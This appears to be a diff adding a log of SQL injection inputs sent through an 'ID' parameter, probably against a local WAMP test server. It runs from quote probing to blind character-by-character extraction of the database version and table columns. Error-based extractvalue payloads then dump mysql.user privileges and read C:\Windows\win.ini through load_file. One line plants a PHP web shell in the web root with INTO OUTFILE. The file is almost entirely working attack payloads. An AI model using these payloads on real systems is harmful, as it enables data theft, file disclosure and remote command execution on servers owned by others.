@@ -1,0 +1,86 @@
+ID:1
+ID:1'
+ID:1
+ID:1
+ID:1" AND 1=1"
+ID:1" AND 1=1"-- 
+ID:1" AND 1=1-- 
+ID:/?id=1" AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name=users),1,1) = i-- 
+ID:/?id=1" AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1) = i-- 
+ID:1" AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1) = i-- 
+ID:1" AND SUBSTRING((SELECT Group_concat(column_name) from information_schema.columns where table_name='users'),1,1) = 'i'-- 
+ID:1"""
+ID:1"""
+ID:12
+ID:1" AND SUBSTRING(version(),1,1)='0'-- 
+ID:1" AND SUBSTRING(version(),1,1)='1'-- 
+ID:1" AND SUBSTRING(version(),1,1)='2'-- 
+ID:1" AND SUBSTRING(version(),1,1)='3'-- 
+ID:1" AND SUBSTRING(version(),1,1)='4'-- 
+ID:1" AND SUBSTRING(version(),1,1)='5'-- 
+ID:1" AND SUBSTRING(version(),2,1)='0'-- 
+ID:1" AND SUBSTRING(version(),2,1)='1'-- 
+ID:1" AND SUBSTRING(version(),2,1)='2'-- 
+ID:1" AND SUBSTRING(version(),2,1)='3'-- 
+ID:1" AND SUBSTRING(version(),2,1)='4'-- 
+ID:1" AND SUBSTRING(version(),2,1)='5'-- 
+ID:1" AND SUBSTRING(version(),2,1)='6'-- 
+ID:1" AND SUBSTRING(version(),2,1)='7'-- 
+ID:1" AND SUBSTRING(version(),2,1)='8'-- 
+ID:1" AND SUBSTRING(version(),2,1)='9'-- 
+ID:1" AND SUBSTRING(version(),2,1)='.'-- 
+ID:1" AND SUBSTRING(version(),3,1)='0'-- 
+ID:1" AND SUBSTRING(version(),3,1)='1'-- 
+ID:1" AND SUBSTRING(version(),3,1)='2'-- 
+ID:1" AND SUBSTRING(version(),3,1)='3'-- 
+ID:1" AND SUBSTRING(version(),3,1)='4'-- 
+ID:1" AND SUBSTRING(version(),3,1)='5'-- 
+ID:1" AND SUBSTRING(version(),4,1)='0'-- 
+ID:1" AND SUBSTRING(version(),4,1)='1'-- 
+ID:1" AND SUBSTRING(version(),4,1)='2'-- 
+ID:1" AND SUBSTRING(version(),4,1)='3'-- 
+ID:1" AND SUBSTRING(version(),4,1)='4'-- 
+ID:1" AND SUBSTRING(version(),4,1)='5'-- 
+ID:1" AND SUBSTRING(version(),4,1)='6'-- 
+ID:1" AND SUBSTRING(version(),4,1)='7'-- 
+ID:1" AND SUBSTRING(version(),4,1)='8'-- 
+ID:1" AND SUBSTRING(version(),4,1)='9'-- 
+ID:1" AND SUBSTRING(version(),4,1)='.'-- 
+ID:1" AND SUBSTRING(version(),5,1)='0'-- 
+ID:1" AND SUBSTRING(version(),5,1)='1'-- 
+ID:1" AND SUBSTRING(version(),5,1)='2'-- 
+ID:1" UNION select --"<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- '
+ID:1" AND SUBSTRING(version(),5,1)='3'-- 
+ID:1" AND SUBSTRING(version(),5,1)='4'-- 
+ID:1" AND SUBSTRING(version(),5,1)='5'-- 
+ID:1" AND SUBSTRING(version(),5,1)='6'-- 
+ID:1" AND SUBSTRING(version(),6,1)='0'-- 
+ID:1" AND SUBSTRING(version(),6,1)='1'-- 
+ID:1" AND SUBSTRING(version(),6,1)='2'-- 
+ID:1" AND SUBSTRING(version(),7,1)='0'-- 
+ID:1" AND SUBSTRING(version(),7,1)='1'-- 
+ID:1" AND SUBSTRING(version(),7,1)='2'-- 
+ID:1" AND SUBSTRING(version(),7,1)='3'-- 
+ID:1" AND SUBSTRING(version(),7,1)='4'-- 
+ID:1" AND SUBSTRING(version(),7,1)='5'-- 
+ID:1" AND SUBSTRING(version(),7,1)='6'-- 
+ID:1" AND SUBSTRING(version(),7,1)='7'-- 
+ID:1" AND SUBSTRING(version(),7,1)='8'-- 
+ID:1" AND SUBSTRING(version(),7,1)='9'-- 
+ID:1" AND SUBSTRING(version(),7,1)='.'-- 
+ID:"
+ID:" or extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user)))-- 
+ID:1" and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:" or extractvalue(1,concat(0x7e,(load_file('C:\\\\Windows\\\\win.ini'))))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),1,100)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),10,100)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),10,10)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),10,20)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),20,20)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),30,20)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),30,40)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),30,80)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),10,80)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),0,80)))-- 
+ID:" or extractvalue(1,concat(0x7e,substring(load_file('C:\\\\Windows\\\\win.ini'),1,80)))-- 
